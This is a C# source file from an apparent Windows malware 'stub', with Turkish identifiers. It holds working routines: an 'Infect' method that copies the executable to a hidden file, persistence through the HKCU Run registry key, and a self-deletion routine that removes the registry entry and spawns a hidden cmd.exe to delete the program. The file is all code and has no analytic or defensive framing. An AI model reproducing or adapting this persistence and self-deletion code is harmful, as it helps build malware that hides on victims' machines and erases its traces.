using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;
using System.Security.Principal;

namespace Stub
{
    static class Register
    {
        public static string Isim;
        public static string Konum;
        public static string Aciklama;

        public static bool IsAdministrator()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.PowerUser);
        }

        public static bool RegeditCheck()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", false);
            if (key.GetValue(Aciklama) != null)
            {
                //Dize Değeri türündeki değer string olarak kullanılabilir
                string regdekiKonum = key.GetValue( Aciklama ).ToString();
                if (Path.GetDirectoryName(Application.ExecutablePath) + "\\" + Path.GetFileName(Application.ExecutablePath) == regdekiKonum)
                {
                    Console.Write("--> Kayıtlı Yerden Basladı\n");
                    return true;
                }
                else
                {
                    Console.Write("--> Baska Aygittan Baslatildi\n");
                    return false;
                }
            }
            else
                return false;
        }

        static bool RegeditSave()
        {
            try
            {
                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    Aciklama,
                    Konum + Isim);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static bool Infect()
        {
            bool regSonuc = RegeditCheck();
            bool dosSonuc = true;
            if (!regSonuc)
            {
                regSonuc = RegeditSave();
                dosSonuc = FileCopyToPC();
            }

            if (regSonuc && dosSonuc)
                return true;
            else
                return false;
        }

        public static bool FileCopyToPC()
        {
            try
            {
                File.Copy(Path.GetDirectoryName(Application.ExecutablePath) + "\\" + Path.GetFileName(Application.ExecutablePath),
                   Konum + Isim,
                   true);
                File.SetAttributes(Konum + Isim,
                    File.GetAttributes(Konum + Isim) | FileAttributes.Hidden);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static void DeleteOwn(string silmeSuresiSaniye)
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                key.DeleteValue(Aciklama);

                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/C choice /C Y /N /D Y /T " + silmeSuresiSaniye + " & Del " + Application.ExecutablePath;
                process.StartInfo = startInfo;
                process.Start();
                Console.WriteLine("Siliniyor...");
                Application.Exit();
            }
            catch
            {

            }
        }
    }
}
